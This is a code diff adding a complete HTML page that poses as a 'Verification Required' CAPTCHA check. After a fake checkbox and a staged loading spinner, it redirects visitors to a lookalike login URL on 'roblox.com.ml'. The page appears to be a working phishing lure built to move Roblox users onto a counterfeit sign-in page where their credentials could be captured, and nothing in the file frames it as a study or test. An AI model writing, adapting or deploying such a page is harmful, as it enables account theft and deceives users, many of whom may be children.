@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verification</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #0f0f1a, #1a1033);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: rgba(28, 28, 40, 0.9);
+      padding: 35px;
+      border-radius: 12px;
+      text-align: center;
+      width: 340px;
+      box-shadow: 0 0 25px rgba(128, 0, 255, 0.2);
+      backdrop-filter: blur(10px);
+    }
+
+    button {
+      padding: 12px;
+      background: linear-gradient(135deg, #7b2cff, #a855f7);
+      border: none;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .captcha {
+      display: none;
+      margin-top: 20px;
+      background: #151526;
+      padding: 12px;
+      border-radius: 8px;
+      text-align: left;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .spinner {
+      border: 4px solid #2a2a40;
+      border-top: 4px solid #a855f7;
+      border-radius: 50%;
+      width: 35px;
+      height: 35px;
+      animation: spin 1s linear infinite;
+      margin: 10px auto;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1c1c2b;
+      padding: 25px;
+      border-radius: 12px;
+      text-align: center;
+      width: 300px;
+      box-shadow: 0 0 30px rgba(128, 0, 255, 0.3);
+    }
+
+    input[type="checkbox"] {
+      accent-color: #a855f7;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Verification Required</h2>
+  <button onclick="start()">Verify Here</button>
+
+  <div class="captcha" id="captcha">
+    <label>
+      <input type="checkbox" id="check"> I'm not a robot
+    </label>
+    <button onclick="verify()">Continue</button>
+  </div>
+
+  <div class="loading" id="loading">
+    <div class="spinner"></div>
+    <p>Verifying...</p>
+  </div>
+</div>
+
+<div class="popup" id="popup">
+  <h3>✅ Verified</h3>
+  <p>Redirecting...</p>
+  <button onclick="redirect()">Continue</button>
+</div>
+
+<script>
+function start() {
+  document.getElementById("captcha").style.display = "block";
+}
+
+function verify() {
+  if (!document.getElementById("check").checked) {
+    alert("Please confirm you're not a robot");
+    return;
+  }
+
+  document.getElementById("captcha").style.display = "none";
+  document.getElementById("loading").style.display = "block";
+
+  // random time between 4–8 seconds
+  let time = Math.floor(Math.random() * 4000) + 4000;
+
+  setTimeout(() => {
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("popup").style.display = "block";
+  }, time);
+}
+
+function redirect() {
+  window.location.href = "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F237907032822%2Fhoodlooms";
+}
+</script>
+
+</body>
+</html>
